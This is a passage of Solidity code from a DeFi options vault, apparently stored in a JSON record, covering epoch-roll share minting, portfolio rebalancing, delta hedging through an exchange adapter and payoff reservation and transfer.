performed during the closing epoch:\n        // If vault has been killed, we go ahead minting shares and the last epoch depositors will have to call `rescueShares()`\n        uint256 sharesToMint = VaultLib.assetToShares(_state.liquidity.pendingDeposits, sharePrice, _shareDecimals);\n        _mint(address(this), sharesToMint);\n\n        lockedLiquidity += _state.liquidity.pendingDeposits;\n        _state.liquidity.pendingDeposits = 0;\n\n        _state.liquidity.lockedInitially = lockedLiquidity;\n\n        if (_state.killed) {\n            // NOTE: no need to adjust balances, since all side tokens should be already converted\n            return;\n        }\n\n        _adjustBalances();\n        _state.liquidity.lockedInitially = notional();\n\n        // NOTE: leave only an even number of base tokens for the DVP epoch\n        if (lockedLiquidity % 2 != 0) {\n            _state.liquidity.lockedInitially -= 1;\n        }\n\n        (uint256 baseTokens, ) = _tokenBalances();\n\n        // NOTE: if after rebalance there's no enough liquidity to fulfill pending liabilities (see [IL-NOTE]) pause vault and signal to admins\n        if (baseTokens < _state.liquidity.pendingWithdrawals + _state.liquidity.pendingPayoffs) {\n            _pause();\n            emit MissingLiquidity(_state.liquidity.pendingWithdrawals + _state.liquidity.pendingPayoffs - baseTokens);\n        }\n    }\n\n    /// @notice Adjusts the balances in order to cover the liquidity locked for pending operations and obtain an equal weight portfolio.\n    function _adjustBalances() internal {\n        address exchangeAddress = _addressProvider.exchangeAdapter();\n        if (exchangeAddress == address(0)) {\n            revert AddressZero();\n        }\n        IExchange exchange = IExchange(exchangeAddress);\n\n        (uint256 baseTokens, uint256 sideTokens) = _tokenBalances();\n        uint256 pendings = _state.liquidity.pendingWithdrawals + _state.liquidity.pendingPayoffs;\n\n        if (baseTokens < pendings) {\n            // We must cover the missing base tokens by selling an amount of side tokens:\n            uint256 missingBaseTokens = pendings - baseTokens;\n            uint256 sideTokensForMissingBaseTokens = exchange.getInputAmount(sideToken, baseToken, missingBaseTokens);\n\n            // see [IL-NOTE]\n            if (sideTokensForMissingBaseTokens > sideTokens) {\n                revert InsufficientLiquidity(\n                    bytes4(keccak256(\"_adjustBalances():sideTokensForMissingBaseTokens > sideTokens\"))\n                );\n            }\n\n            // Once we covered the missing base tokens, we still have to reach an equal weight portfolio\n            // with residual liquidity, so we also have to sell half of the remaining side tokens\n            uint256 halfOfRemainingSideTokens = (sideTokens - sideTokensForMissingBaseTokens) / 2;\n            uint256 sideTokensToSell = sideTokensForMissingBaseTokens + halfOfRemainingSideTokens;\n            _sellSideTokens(sideTokensToSell);\n        } else {\n            uint256 halfNotional = notional() / 2;\n            uint256 targetSideTokens = exchange.getOutputAmount(baseToken, sideToken, halfNotional);\n\n            // NOTE: here we are not interested in the number of exchanged base tokens\n            _deltaHedge(int256(targetSideTokens) - int256(sideTokens));\n        }\n    }\n\n    /// @inheritdoc EpochControls\n    function _afterRollEpoch() internal virtual override {\n        emit VaultTVL(getEpoch().current, v0());\n    }\n\n    /// @inheritdoc IVault\n    function deltaHedge(int256 sideTokensAmount) external onlyDVP isNotDead whenNotPaused returns (uint256 baseTokens) {\n        return _deltaHedge(sideTokensAmount);\n    }\n\n    /**\n        @notice Adjust the portfolio by trading the given amount of side tokens.\n        @param sideTokensAmount The amount of side tokens to buy (positive value) / sell (negative value).\n        @return baseTokens The amount of exchanged base tokens.\n     */\n    function _deltaHedge(int256 sideTokensAmount) internal returns (uint256 baseTokens) {\n        if (sideTokensAmount > 0) {\n            uint256 amount = uint256(sideTokensAmount);\n            return _buySideTokens(amount);\n        } else {\n            uint256 amount = uint256(-sideTokensAmount);\n            return _sellSideTokens(amount);\n        }\n    }\n\n    /**\n        @notice Swap some of the available base tokens in order to obtain the provided amount of side tokens.\n        @param amount The amount of side tokens to buy.\n        @return baseTokens The amount of exchanged base tokens.\n     */\n    function _buySideTokens(uint256 amount) internal returns (uint256 baseTokens) {\n        if (amount == 0) {\n            return 0;\n        }\n        address exchangeAddress = _addressProvider.exchangeAdapter();\n        if (exchangeAddress == address(0)) {\n            revert AddressZero();\n        }\n        IExchange exchange = IExchange(exchangeAddress);\n\n        uint256 requiredInput = exchange.getInputAmountMax(baseToken, sideToken, amount);\n        uint256 minRequiredInput = exchange.getInputAmount(baseToken, sideToken, amount);\n\n        uint256 amountToApprove = requiredInput;\n        uint256 availableBaseTokens = _notionalBaseTokens();\n\n        // Since `requiredInput` should be an over-estimate, if available tokens are not enough to cover `getInputAmountMax`, try to approve all and do the swap\n        if (availableBaseTokens < requiredInput) {\n            amountToApprove = availableBaseTokens;\n\n            // If even `minRequiredInput` cannot be covered, we reduce the required side tokens amount up to a X% safety margin to tackle with extreme scenarios where swap slippages may reduce the initial notional used for hedging computation\n            if (availableBaseTokens < minRequiredInput) {\n                amount -= (amount * _hedgeMargin) / 10000;\n            }\n        }\n\n        IERC20(baseToken).safeApprove(exchangeAddress, amountToApprove);\n        baseTokens = exchange.swapOut(baseToken, sideToken, amount, amountToApprove);\n\n        // // Improvement: in order to standardize error response, catch a custom Adapter error when given input is < requested\n        // try exchange.swapOut(baseToken, sideToken, amount, amountToApprove) returns (uint256 inputBaseTokens) {\n        //     baseTokens = inputBaseTokens;\n        // } catch (bytes memory reason) {\n        //     // catch failing assert()\n        //     if (bytes4(reason) == bytes4(keccak256(\"InsufficientInput()\"))) {\n        //         revert InsufficientLiquidity(bytes4(keccak256(\"_buySideTokens()\")));\n        //     }\n        //     revert FailingDeltaHedge();\n        // }\n    }\n\n    /**\n        @notice Swap the provided amount of side tokens in exchange for base tokens.\n        @param amount The amount of side tokens to sell.\n        @return baseTokens The amount of exchanged base tokens.\n     */\n    function _sellSideTokens(uint256 amount) internal returns (uint256 baseTokens) {\n        if (amount == 0) {\n            return 0;\n        }\n        (, uint256 sideTokens) = _tokenBalances();\n        if (amount > sideTokens) {\n            revert InsufficientLiquidity(bytes4(keccak256(\"_sellSideTokens()\")));\n        }\n\n        address exchangeAddress = _addressProvider.exchangeAdapter();\n        if (exchangeAddress == address(0)) {\n            revert AddressZero();\n        }\n        IExchange exchange = IExchange(exchangeAddress);\n\n        IERC20(sideToken).safeApprove(exchangeAddress, amount);\n        baseTokens = exchange.swapIn(sideToken, baseToken, amount);\n    }\n\n    /// @inheritdoc IVault\n    function reservePayoff(uint256 residualPayoff) external onlyDVP {\n        if (residualPayoff > notional()) {\n            revert InsufficientLiquidity(bytes4(keccak256(\"reservePayoff()\")));\n        }\n        _state.liquidity.newPendingPayoffs = residualPayoff;\n    }\n\n    /// @inheritdoc IVault\n    function transferPayoff(address recipient, uint256 amount, bool isPastEpoch) external onlyDVP whenNotPaused {\n        if (amount == 0) {\n            return;\n        }\n\n        if (isPastEpoch) {\n            if (amount > _state.liquidity.pendingPayoffs) {\n                revert ExceedsAvailable();\n            }\n            _state.liquidity.pendingPayoffs -= amount"
    }
  ]
}